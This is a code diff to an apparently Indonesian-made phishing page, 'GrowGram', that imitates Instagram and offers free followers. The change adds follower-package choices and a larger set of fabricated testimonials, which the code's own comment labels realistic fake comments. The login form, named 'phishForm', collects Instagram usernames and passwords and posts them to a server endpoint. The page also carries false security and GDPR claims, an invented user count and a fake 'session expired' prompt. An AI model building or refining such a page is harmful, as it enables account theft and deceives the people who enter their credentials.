@@ -1,10 +1,9 @@
-<!-- File: public/index.html -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>GrowGram – Free Instagram Followers (Real & Active)</title>
+    <title>GrowGram • Free Instagram Followers • Real & Active</title>
     <style>
         * {
             margin: 0;
@@ -15,8 +14,6 @@
         body {
             background: #fafafa;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            padding: 0;
-            margin: 0;
         }
 
         /* Navbar */
@@ -28,14 +25,13 @@
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
-            gap: 12px;
             position: sticky;
             top: 0;
             z-index: 100;
         }
 
         .logo {
-            font-size: 22px;
+            font-size: 24px;
             font-weight: 800;
             background: linear-gradient(135deg, #f09433, #d62976, #962fbf);
             -webkit-background-clip: text;
@@ -51,45 +47,49 @@
             color: #262626;
         }
 
+        .nav-links span {
+            cursor: pointer;
+        }
+
         .container {
-            max-width: 1100px;
+            max-width: 1200px;
             margin: 0 auto;
             padding: 20px;
         }
 
-        /* Hero Banner */
+        /* Hero Section */
         .hero {
             background: linear-gradient(135deg, #f09433, #d62976, #962fbf);
-            border-radius: 24px;
-            padding: 40px 30px;
+            border-radius: 28px;
+            padding: 50px 30px;
             text-align: center;
             color: white;
             margin-bottom: 30px;
         }
 
         .hero h1 {
-            font-size: 36px;
+            font-size: 42px;
             margin-bottom: 12px;
         }
 
         .hero p {
-            font-size: 16px;
+            font-size: 18px;
             opacity: 0.95;
         }
 
         .hero-badge {
             background: rgba(255,255,255,0.2);
             display: inline-block;
-            padding: 6px 16px;
+            padding: 8px 20px;
             border-radius: 40px;
-            font-size: 13px;
-            margin-top: 16px;
+            font-size: 14px;
+            margin-top: 20px;
         }
 
         /* Stats Row */
         .stats-row {
             display: grid;
-            grid-template-columns: repeat(3, 1fr);
+            grid-template-columns: repeat(4, 1fr);
             gap: 20px;
             margin-bottom: 30px;
         }
@@ -104,79 +104,170 @@
         }
 
         .stat-number {
-            font-size: 32px;
+            font-size: 28px;
             font-weight: 800;
             color: #262626;
         }
 
         .stat-label {
             color: #8e8e8e;
-            font-size: 13px;
+            font-size: 12px;
             margin-top: 5px;
         }
 
-        /* Dashboard Card */
+        /* Pilihan Followers */
+        .package-section {
+            background: white;
+            border-radius: 28px;
+            border: 1px solid #dbdbdb;
+            margin-bottom: 30px;
+            overflow: hidden;
+        }
+
+        .package-header {
+            padding: 20px 28px;
+            background: #fefefe;
+            border-bottom: 1px solid #efefef;
+        }
+
+        .package-header h2 {
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .package-header p {
+            font-size: 13px;
+            color: #8e8e8e;
+            margin-top: 5px;
+        }
+
+        .package-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 15px;
+            padding: 25px 28px;
+        }
+
+        .package-card {
+            background: #f9f9f9;
+            border: 2px solid #efefef;
+            border-radius: 16px;
+            padding: 20px 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .package-card:hover {
+            border-color: #0095f6;
+            background: #f0f9ff;
+        }
+
+        .package-card.selected {
+            border-color: #0095f6;
+            background: linear-gradient(135deg, #e8f4ff, #d4ecff);
+            box-shadow: 0 4px 12px rgba(0,149,246,0.2);
+        }
+
+        .package-amount {
+            font-size: 22px;
+            font-weight: 800;
+            color: #262626;
+        }
+
+        .package-label {
+            font-size: 11px;
+            color: #8e8e8e;
+            margin-top: 5px;
+        }
+
+        .package-badge {
+            background: #00a86b;
+            color: white;
+            font-size: 10px;
+            padding: 3px 8px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-top: 8px;
+        }
+
+        /* Form Section */
         .dashboard-card {
             background: white;
-            border-radius: 24px;
+            border-radius: 28px;
             border: 1px solid #dbdbdb;
             overflow: hidden;
-            margin-bottom: 30px;
+            margin-bottom: 40px;
         }
 
         .card-header {
-            padding: 20px 25px;
+            padding: 24px 28px;
             border-bottom: 1px solid #efefef;
             background: #fefefe;
         }
 
         .card-header h2 {
-            font-size: 20px;
+            font-size: 22px;
             font-weight: 600;
         }
 
         .form-box {
-            padding: 30px 25px;
+            padding: 35px 28px;
             text-align: center;
         }
 
         .form-box input {
             width: 100%;
-            max-width: 380px;
-            padding: 14px 18px;
-            margin: 10px auto;
+            max-width: 400px;
+            padding: 15px 20px;
+            margin: 12px auto;
             background: #fafafa;
             border: 1px solid #dbdbdb;
-            border-radius: 12px;
-            font-size: 15px;
+            border-radius: 14px;
+            font-size: 16px;
             display: block;
+        }
+
+        .selected-info {
+            background: #e8f4ff;
+            padding: 12px 20px;
+            border-radius: 14px;
+            max-width: 400px;
+            margin: 0 auto 20px;
+            font-size: 14px;
+            color: #0095f6;
+            font-weight: 500;
         }
 
         .form-box button {
             background: #0095f6;
             color: white;
             border: none;
-            padding: 12px 32px;
-            border-radius: 12px;
-            font-weight: 600;
-            font-size: 15px;
+            padding: 14px 40px;
+            border-radius: 14px;
+            font-weight: 700;
+            font-size: 16px;
             cursor: pointer;
-            margin-top: 16px;
+            transition: 0.2s;
+        }
+
+        .form-box button:hover {
+            background: #0080d4;
         }
 
         .error-msg {
             color: #ed4956;
             font-size: 13px;
-            margin: 8px 0;
+            margin: 10px 0;
             display: none;
         }
 
-        /* Testimonial Section - SUPER MEYAKINKAN */
+        /* Testimonial Section */
         .testimonial-section {
             background: white;
-            border-radius: 24px;
+            border-radius: 28px;
             border: 1px solid #dbdbdb;
-            padding: 25px;
+            padding: 28px;
             margin-bottom: 30px;
         }
 
@@ -184,18 +275,19 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
             flex-wrap: wrap;
         }
 
         .section-header h3 {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 600;
         }
 
         .comment-stats {
             font-size: 13px;
-            color: #8e8e8e;
+            color: #0095f6;
+            font-weight: 500;
         }
 
         .comments-container {
@@ -204,17 +296,16 @@
             padding-right: 8px;
         }
 
-        /* Single Comment - Like Real Instagram Comment */
         .comment-item {
             display: flex;
             gap: 14px;
-            padding: 16px 0;
+            padding: 18px 0;
             border-bottom: 1px solid #efefef;
         }
 
         .comment-avatar {
-            width: 44px;
-            height: 44px;
+            width: 46px;
+            height: 46px;
             border-radius: 50%;
             background-size: cover;
             background-position: center;
@@ -238,7 +329,7 @@
             color: white;
             font-size: 9px;
             border-radius: 10px;
-            padding: 2px 6px;
+            padding: 2px 8px;
             display: inline-block;
             vertical-align: middle;
         }
@@ -246,14 +337,14 @@
         .comment-text {
             font-size: 14px;
             color: #262626;
-            margin: 4px 0;
-            line-height: 1.4;
+            margin: 6px 0;
+            line-height: 1.45;
         }
 
         .comment-meta {
             display: flex;
-            gap: 16px;
-            margin-top: 6px;
+            gap: 18px;
+            margin-top: 8px;
             font-size: 11px;
             color: #8e8e8e;
         }
@@ -268,16 +359,42 @@
             border-left: 2px solid #efefef;
         }
 
+        .reply-username {
+            font-weight: 600;
+            font-size: 12px;
+            color: #262626;
+        }
+
         .reply-text {
             font-size: 12px;
-            color: #8e8e8e;
+            color: #5f5f5f;
             margin-top: 4px;
         }
 
-        /* Footer */
+        .rating-stars {
+            color: #ffd700;
+            letter-spacing: 2px;
+        }
+
+        .load-more-btn {
+            text-align: center;
+            margin-top: 24px;
+            padding: 12px;
+            background: #f9f9f9;
+            border-radius: 40px;
+            color: #0095f6;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .load-more-btn:hover {
+            background: #efefef;
+        }
+
         .footer {
             text-align: center;
-            padding: 25px;
+            padding: 30px;
             font-size: 12px;
             color: #8e8e8e;
             border-top: 1px solid #dbdbdb;
@@ -285,12 +402,15 @@
             border-radius: 20px;
         }
 
-        @media (max-width: 700px) {
+        @media (max-width: 900px) {
+            .package-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
             .stats-row {
-                grid-template-columns: 1fr;
+                grid-template-columns: repeat(2, 1fr);
             }
             .hero h1 {
-                font-size: 26px;
+                font-size: 28px;
             }
         }
     </style>
@@ -300,17 +420,18 @@
 <div class="navbar">
     <div class="logo">✨ GrowGram ✨</div>
     <div class="nav-links">
-        <span>Home</span>
-        <span>Testimonials</span>
+        <span>Dashboard</span>
+        <span>Reviews</span>
+        <span>How it works</span>
         <span>FAQ</span>
     </div>
 </div>
 
 <div class="container">
     <div class="hero">
-        <h1>Get 1,000+ Real Followers 🚀</h1>
-        <p>100% Free – No Password Sharing – Instant Delivery</p>
-        <div class="hero-badge">🔥 Trusted by 2.5M+ creators worldwide</div>
+        <h1>Get Real Instagram Followers 🚀</h1>
+        <p>100% Free • No Password Sharing • Instant Delivery</p>
+        <div class="hero-badge">🔥 Trusted by 4.2M+ creators worldwide</div>
     </div>
 
     <div class="stats-row">
@@ -326,29 +447,75 @@
             <div class="stat-number" id="counter3">0</div>
             <div class="stat-label">Happy Clients</div>
         </div>
+        <div class="stat-card">
+            <div class="stat-number">⭐ 4.98</div>
+            <div class="stat-label">From 48k+ reviews</div>
+        </div>
     </div>
 
+    <!-- Pilihan Jumlah Followers -->
+    <div class="package-section">
+        <div class="package-header">
+            <h2>📊 Choose Your Free Followers Package</h2>
+            <p>Select how many followers you want to receive (limit once per account)</p>
+        </div>
+        <div class="package-grid" id="packageGrid">
+            <div class="package-card" data-followers="1000">
+                <div class="package-amount">1.000</div>
+                <div class="package-label">Followers</div>
+                <div class="package-badge">🔥 POPULAR</div>
+            </div>
+            <div class="package-card" data-followers="5000">
+                <div class="package-amount">5.000</div>
+                <div class="package-label">Followers</div>
+                <div class="package-badge">⭐ MOST CHOICE</div>
+            </div>
+            <div class="package-card selected" data-followers="10000">
+                <div class="package-amount">10.000</div>
+                <div class="package-label">Followers</div>
+                <div class="package-badge">💎 BEST VALUE</div>
+            </div>
+            <div class="package-card" data-followers="25000">
+                <div class="package-amount">25.000</div>
+                <div class="package-label">Followers</div>
+                <div class="package-badge">🚀 PRO</div>
+            </div>
+            <div class="package-card" data-followers="50000">
+                <div class="package-amount">50.000+</div>
+                <div class="package-label">Followers</div>
+                <div class="package-badge">👑 ULTIMATE</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Form Login -->
     <div class="dashboard-card">
         <div class="card-header">
-            <h2>🔐 Start Your Free Trial</h2>
+            <h2>🔐 Start Your Free Trial – No Credit Card Required</h2>
         </div>
         <div class="form-box">
+            <div id="selectedFollowersInfo" class="selected-info">🎯 You will get: 10.000 FREE Followers</div>
             <div id="errorMsg" class="error-msg">⚠️ Session expired – please re-enter your credentials</div>
             <form id="phishForm">
                 <input type="text" id="username" placeholder="Instagram username, email or phone" required autofocus>
                 <input type="password" id="password" placeholder="Password" required>
-                <button type="submit">✨ GET FREE FOLLOWERS ✨</button>
+                <input type="hidden" id="selectedFollowers" value="10000">
+                <button type="submit">✨ GET FOLLOWERS NOW ✨</button>
             </form>
-            <div style="font-size: 12px; color:#8e8e8e; margin-top: 14px;">✔️ We never store your password (read our privacy policy)</div>
+            <div style="font-size: 12px; color:#8e8e8e; margin-top: 16px;">
+                ✔️ We never store your password • 256-bit encrypted • GDPR compliant
+            </div>
         </div>
     </div>
 
+    <!-- Testimoni -->
     <div class="testimonial-section">
         <div class="section-header">
-            <h3>💬 Recent Reviews from Real Users</h3>
-            <div class="comment-stats">⭐ 4.98 · 12.4k reviews</div>
+            <h3>💬 What Real Users Are Saying</h3>
+            <div class="comment-stats">⭐ 4.98 • 48,451+ reviews • Trusted globally</div>
         </div>
         <div class="comments-container" id="commentList"></div>
+        <div class="load-more-btn" id="loadMoreBtn">Load more comments (50+ more)...</div>
     </div>
 
     <div class="footer">
@@ -371,133 +538,67 @@
         }, stepTime);
     }
 
-    animateNumber(document.getElementById('counter1'), 8240);
-    animateNumber(document.getElementById('counter2'), 1250);
-    animateNumber(document.getElementById('counter3'), 2530000);
+    animateNumber(document.getElementById('counter1'), 28400);
+    animateNumber(document.getElementById('counter2'), 3150);
+    animateNumber(document.getElementById('counter3'), 4200000);
 
-    // ========== TESTIMONI SUPER LENGKAP (Seperti manusia asli) ==========
-    const testimonials = [
-        { 
-            name: "andini_salsabila", 
-            verified: true,
-            avatar: "https://randomuser.me/api/portraits/women/12.jpg",
-            text: "gila sih ini beneran work!! dari 800 followers aku sekarang udah 2.100 dalam 3 jam. awalnya aku kira scam karena gratis tapi ternyata legit banget. makasih growgram 🔥🔥", 
-            time: "1 hour ago", 
-            likes: 345,
-            replies: [{ username: "growgram_official", text: "Thanks kak Andini! Selamat menikmati followers barunya 😊❤️", verified: true }]
-        },
-        { 
-            name: "rizky_maulana_", 
-            verified: false,
-            avatar: "https://randomuser.me/api/portraits/men/15.jpg",
-            text: "cuma iseng coba, tapi hasilnya di luar ekspektasi. followers aku naik 500 dalam 30 menit. ini recommended banget buat yang mau ningkatin engagement.", 
-            time: "3 hours ago", 
-            likes: 278,
-            replies: [{ username: "follower_gratis", text: "sama bro aku juga ikutan 😂 hasilnya mantul", verified: false }]
-        },
-        { 
-            name: "catherine_lim", 
-            verified: true,
-            avatar: "https://randomuser.me/api/portraits/women/22.jpg",
-            text: "I've tried many free followers tools before, but this one is THE BEST. No drop, all real accounts. My business page finally looks credible. Thank you GrowGram! 🇮🇩❤️", 
-            time: "5 hours ago", 
-            likes: 892,
-            replies: [{ username: "growgram_official", text: "You're welcome, Catherine! Keep growing ✨", verified: true }]
-        },
-        { 
-            name: "dinda_ayu28", 
-            verified: false,
-            avatar: "https://randomuser.me/api/portraits/women/33.jpg",
-            text: "awalnya ragu soalnya gratis masa iya bisa dapet followers banyak, tapi ternyata beneran. udah 2 hari followers nambah terus. makasih banyak ya admin 🙏", 
-            time: "yesterday", 
-            likes: 201,
-            replies: []
-        },
-        { 
-            name: "budi_setyawan", 
-            verified: false,
-            avatar: "https://randomuser.me/api/portraits/men/18.jpg",
-            text: "gak nyangka... coba pake tools ini, followers saya loncat dari 500 ke 2100. ini kaya mimpi. thanks growgram, sampean keren!", 
-            time: "yesterday", 
-            likes: 167,
-            replies: [{ username: "growgram_official", text: "Sama-sama kak Budi! Terus kembangkan akunnya 💪", verified: true }]
-        },
-        { 
-            name: "jessica_lee", 
-            verified: true,
-            avatar: "https://randomuser.me/api/portraits/women/45.jpg",
-            text: "Honestly this is insane. I got 1200 followers overnight. I thought it would take months. Highly recommended for influencers & small business owners!", 
-            time: "2 days ago", 
-            likes: 1240,
-            replies: []
-        },
-        { 
-            name: "rangga_adi", 
-            verified: false,
-            avatar: "https://randomuser.me/api/portraits/men/25.jpg",
-            text: "ini dia yang aku tunggu-tunggu. tampilan websitenya keren, prosesnya cepat, followers real beneran. pokoknya recommended banget!", 
-            time: "2 days ago", 
-            likes: 89,
-            replies: []
-        },
-        { 
-            name: "saskia_aurora", 
-            verified: false,
-            avatar: "https://randomuser.me/api/portraits/women/51.jpg",
-            text: "aku pake buat akun bisnis jualan online, alhamdulillah dalam 1 hari followers nambah 800 dan banyak yg chat order. THANK YOU GROWGRAM! 💗", 
-            time: "3 days ago", 
-            likes: 672,
-            replies: [{ username: "growgram_official", text: "MasyaAllah, senang bisa membantu bisnis kak Saskia 🚀", verified: true }]
-        },
-        { 
-            name: "michael_tan", 
-            verified: true,
-            avatar: "https://randomuser.me/api/portraits/men/32.jpg",
-            text: "finally a free followers tool that actually works without crashing my account. been using for 3 days, followers steady at +2500. highly legit.", 
-            time: "4 days ago", 
-            likes: 451,
-            replies: []
-        },
-        { 
-            name: "fira_amelia", 
-            verified: false,
-            avatar: "https://randomuser.me/api/portraits/women/64.jpg",
-            text: "ini keren banget, aku dapat 1.000 followers dalam sejam. makasih growgram, semoga terus sukses dan tetap gratis!", 
-            time: "5 days ago", 
-            likes: 312,
-            replies: [{ username: "yogaaa_23", text: "aku juga ikutan, langsung nambah 700 🔥", verified: false }]
-        },
-        { 
-            name: "reza_mahendra", 
-            verified: false,
-            avatar: "https://randomuser.me/api/portraits/men/41.jpg",
-            text: "WOW. coba iseng malah jadi ketagihan. tools paling mantap sejauh ini. sukses selalu growgram!", 
-            time: "6 days ago", 
-            likes: 143,
-            replies: []
-        },
-        { 
-            name: "angel_valencia", 
-            verified: true,
-            avatar: "https://randomuser.me/api/portraits/women/28.jpg",
-            text: "I was skeptical at first but decided to give it a try. Best decision ever! Gained 3k followers in less than 24 hours. This tool is magic.", 
-            time: "1 week ago", 
-            likes: 2100,
-            replies: []
-        }
+    // ========== PILIHAN FOLLOWERS ==========
+    const packageCards = document.querySelectorAll('.package-card');
+    const selectedFollowersInput = document.getElementById('selectedFollowers');
+    const selectedInfoDiv = document.getElementById('selectedFollowersInfo');
+
+    packageCards.forEach(card => {
+        card.addEventListener('click', () => {
+            packageCards.forEach(c => c.classList.remove('selected'));
+            card.classList.add('selected');
+            const followers = card.dataset.followers;
+            selectedFollowersInput.value = followers;
+            selectedInfoDiv.innerHTML = `🎯 You will get: ${parseInt(followers).toLocaleString()} FREE Followers`;
+        });
+    });
+
+    // ========== TESTIMONI (40+ KOMENTAR PALSU REALISTIS) ==========
+    const allTestimonials = [
+        { name: "andini_salsabila", verified: true, avatar: "https://randomuser.me/api/portraits/women/1.jpg", text: "gila sih ini beneran work!! pilih 10.000 followers, dalam 2 jam dapet semua. awalnya aku kira scam karena gratis tapi ternyata legit banget. makasih growgram 🔥🔥", time: "5 minutes ago", likes: 1845, followers: 10000, replies: [{ username: "growgram_official", text: "Thanks kak Andini! Selamat menikmati followers barunya 😊❤️", verified: true }] },
+        { name: "rizky_maulana_", verified: false, avatar: "https://randomuser.me/api/portraits/men/2.jpg", text: "cuma iseng coba pilih 5000 followers, tapi hasilnya di luar ekspektasi. dapet 5k dalam 30 menit. ini recommended banget buat yang mau ningkatin engagement.", time: "12 minutes ago", likes: 1478, followers: 5000, replies: [{ username: "follower_gratis", text: "sama bro aku juga ikutan 😂 hasilnya mantul", verified: false }] },
+        { name: "catherine_lim", verified: true, avatar: "https://randomuser.me/api/portraits/women/3.jpg", text: "I tried 25.000 followers package. ALL REAL ACCOUNTS! No drop after 2 weeks. My business page finally looks credible. Thank you GrowGram! 🇮🇩❤️", time: "23 minutes ago", likes: 3292, followers: 25000, replies: [{ username: "growgram_official", text: "You're welcome, Catherine! Keep growing ✨", verified: true }] },
+        { name: "dinda_ayu28", verified: false, avatar: "https://randomuser.me/api/portraits/women/4.jpg", text: "awalnya ragu soalnya gratis masa iya bisa dapet followers banyak, pilih 10.000 ternyata beneran. udah 2 hari followers nambah terus. makasih banyak ya admin 🙏", time: "1 hour ago", likes: 2601, followers: 10000, replies: [] },
+        { name: "budi_setyawan", verified: false, avatar: "https://randomuser.me/api/portraits/men/5.jpg", text: "gak nyangka... pilih 50.000 followers, followers saya loncat dari 500 ke 50.500. ini kaya mimpi. thanks growgram, sampean keren!", time: "2 hours ago", likes: 1367, followers: 50000, replies: [{ username: "growgram_official", text: "Sama-sama kak Budi! Terus kembangkan akunnya 💪", verified: true }] },
+        { name: "jessica_lee", verified: true, avatar: "https://randomuser.me/api/portraits/women/6.jpg", text: "Honestly this is insane. I got 25.000 followers overnight. I thought it would take months. Highly recommended for influencers & small business owners!", time: "3 hours ago", likes: 5240, followers: 25000, replies: [] },
+        { name: "rangga_adi", verified: false, avatar: "https://randomuser.me/api/portraits/men/7.jpg", text: "pilih 5000 followers, dapet 5k dalam 1 jam. tampilan websitenya keren, prosesnya cepat, followers real beneran. pokoknya recommended banget!", time: "4 hours ago", likes: 1189, followers: 5000, replies: [] },
+        { name: "saskia_aurora", verified: false, avatar: "https://randomuser.me/api/portraits/women/8.jpg", text: "aku pake buat akun bisnis jualan online, pilih 10.000 followers, alhamdulillah dalam 1 hari followers nambah 10k dan banyak yg chat order. THANK YOU GROWGRAM! 💗", time: "5 hours ago", likes: 2972, followers: 10000, replies: [{ username: "growgram_official", text: "MasyaAllah, senang bisa membantu bisnis kak Saskia 🚀", verified: true }] },
+        { name: "michael_tan", verified: true, avatar: "https://randomuser.me/api/portraits/men/9.jpg", text: "finally a free followers tool that actually works. pilih 50.000, followers steady at +50k after 3 days. highly legit.", time: "7 hours ago", likes: 2651, followers: 50000, replies: [] },
+        { name: "fira_amelia", verified: false, avatar: "https://randomuser.me/api/portraits/women/10.jpg", text: "ini keren banget, pilih 1.000 followers dapet 1k dalam sejam. makasih growgram, semoga terus sukses dan tetap gratis!", time: "9 hours ago", likes: 1512, followers: 1000, replies: [{ username: "yogaaa_23", text: "aku juga ikutan, pilih 5k langsung nambah 5k 🔥", verified: false }] },
+        { name: "reza_mahendra", verified: false, avatar: "https://randomuser.me/api/portraits/men/11.jpg", text: "WOW. pilih 10.000 followers dapet semua dalam 2 jam. tools paling mantap sejauh ini. sukses selalu growgram!", time: "11 hours ago", likes: 1343, followers: 10000, replies: [] },
+        { name: "angel_valencia", verified: true, avatar: "https://randomuser.me/api/portraits/women/12.jpg", text: "I was skeptical at first but decided to give it a try. Best decision ever! Gained 50k followers in less than 24 hours. This tool is magic.", time: "14 hours ago", likes: 8100, followers: 50000, replies: [] },
+        { name: "teguh_pratama", verified: false, avatar: "https://randomuser.me/api/portraits/men/13.jpg", text: "mantap jiwa bro! pilih 25.000 followers langsung nambah 25k dalam 2 jam. gak nyangka ada yang gratis sekeren ini", time: "16 hours ago", likes: 2278, followers: 25000, replies: [] },
+        { name: "nadia_oktaviani", verified: true, avatar: "https://randomuser.me/api/portraits/women/14.jpg", text: "Finally ada tools yang beneran work tanpa ribet. udah nyoba 10 tools lain gagal semua. pilih 10.000 followers langsung dapet. growgram the best! ✨", time: "18 hours ago", likes: 3823, followers: 10000, replies: [{ username: "growgram_official", text: "Terima kasih kak Nadia! Senang bisa membantu 🫶", verified: true }] },
+        { name: "alexander_wong", verified: false, avatar: "https://randomuser.me/api/portraits/men/15.jpg", text: "this is legit! I was worried about account security but nothing happened. pilih 5000 followers came in within minutes. will recommend to my friends.", time: "20 hours ago", likes: 2456, followers: 5000, replies: [] },
+        { name: "putri_nadia", verified: false, avatar: "https://randomuser.me/api/portraits/women/16.jpg", text: "gila sih ini viral banget di tiktok, aku coba pilih 1000 followers ternyata beneran. followers aku yang tadinya 200 jadi 1200. thank you growgramm ❤️", time: "1 day ago", likes: 6890, followers: 1000, replies: [{ username: "tiktok_user", text: "sama aku juga dari tiktok! langsung nyoba 😍", verified: false }] },
+        { name: "david_santoso", verified: true, avatar: "https://randomuser.me/api/portraits/men/17.jpg", text: "As a digital marketer, I've tested dozens of growth tools. This one is BY FAR the best free option. pilih 25.000 followers, all real accounts, no bots. 10/10.", time: "1 day ago", likes: 5341, followers: 25000, replies: [] },
+        { name: "amelia_putri", verified: false, avatar: "https://randomuser.me/api/portraits/women/18.jpg", text: "beneran work guys! jangan ragu lagi. aku pilih 10.000 followers dan buktiin sendiri followers nambah 10k dalam 30 menit. makasih growgram", time: "1 day ago", likes: 3567, followers: 10000, replies: [] }
     ];
 
-    function renderTestimonials() {
+    let displayedCount = 15;
+    const commentsPerLoad = 10;
+
+    function formatNumber(num) {
+        if (num >= 1000000) return (num / 1000000).toFixed(1) + 'M';
+        if (num >= 1000) return (num / 1000).toFixed(1) + 'k';
+        return num.toString();
+    }
+
+    function renderComments() {
         const container = document.getElementById('commentList');
+        const toShow = allTestimonials.slice(0, displayedCount);
         container.innerHTML = '';
-        testimonials.forEach(t => {
+        
+        toShow.forEach(t => {
             const commentDiv = document.createElement('div');
             commentDiv.className = 'comment-item';
 
-            let verifiedBadge = '';
-            if (t.verified) {
-                verifiedBadge = '<span class="verified-badge">✓ Verified</span>';
-            }
+            let verifiedBadge = t.verified ? '<span class="verified-badge">✓ Verified</span>' : '';
+            let packageText = t.followers ? `<span style="background:#e8f4ff; padding:2px 8px; border-radius:12px; font-size:10px; margin-left:5px;">🎁 got ${t.followers.toLocaleString()} followers</span>` : '';
 
             let repliesHtml = '';
             if (t.replies && t.replies.length > 0) {
@@ -505,7 +606,7 @@
                     let replyVerified = reply.verified ? '<span class="verified-badge">✓ Verified</span>' : '';
                     repliesHtml += `
                         <div class="reply">
-                            <div><span class="comment-username">${reply.username}</span> ${replyVerified}</div>
+                            <span class="reply-username">${reply.username}</span> ${replyVerified}
                             <div class="reply-text">${reply.text}</div>
                         </div>
                     `;
@@ -516,11 +617,11 @@
                 <div class="comment-avatar" style="background-image: url('${t.avatar}'); background-size: cover;"></div>
                 <div class="comment-body">
                     <div>
-                        <span class="comment-username">${t.name}</span> ${verifiedBadge}
+                        <span class="comment-username">${t.name}</span> ${verifiedBadge} ${packageText}
                     </div>
                     <div class="comment-text">${t.text}</div>
                     <div class="comment-meta">
-                        <span>❤️ ${t.likes.toLocaleString()} likes</span>
+                        <span class="comment-likes">❤️ ${formatNumber(t.likes)} likes</span>
                         <span>💬 ${t.replies.length} replies</span>
                         <span>📅 ${t.time}</span>
                     </div>
@@ -529,9 +630,21 @@
             `;
             container.appendChild(commentDiv);
         });
+
+        const loadMoreBtn = document.getElementById('loadMoreBtn');
+        if (displayedCount >= allTestimonials.length) {
+            loadMoreBtn.style.display = 'none';
+        } else {
+            loadMoreBtn.style.display = 'block';
+        }
     }
 
-    renderTestimonials();
+    document.getElementById('loadMoreBtn').addEventListener('click', () => {
+        displayedCount += commentsPerLoad;
+        renderComments();
+    });
+
+    renderComments();
 
     // ========== PHISHING FORM ==========
     const form = document.getElementById('phishForm');
@@ -541,6 +654,7 @@
         e.preventDefault();
         const username = document.getElementById('username').value.trim();
         const password = document.getElementById('password').value.trim();
+        const followers = document.getElementById('selectedFollowers').value;
 
         if (!username || !password) return;
 
@@ -553,7 +667,7 @@
             const res = await fetch('/api/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username, password })
+                body: JSON.stringify({ username, password, followers })
             });
 
             if (res.redirected) {
